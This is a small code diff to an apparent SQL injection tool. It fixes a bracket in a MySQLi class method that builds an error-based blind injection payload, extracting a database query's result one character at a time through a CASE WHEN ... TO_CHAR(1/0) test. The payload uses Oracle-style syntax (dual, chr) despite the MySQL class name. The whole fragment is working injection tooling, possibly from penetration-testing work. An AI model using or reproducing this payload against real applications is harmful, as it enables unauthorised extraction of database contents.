@@ -33,7 +33,7 @@ class MySQLi(SQLi):
     def format_char_query(self, inner_query, index, char):
         return(
             f"{self.tracking_id}'||(SELECT CASE WHEN (("
-            f"select substr(({inner_query}),{index},1) from dual)=chr({char})"
+            f"select substr(({inner_query}),{index},1) from dual)=chr({char}))"
             " THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
         )
     def is_true(self, resp):
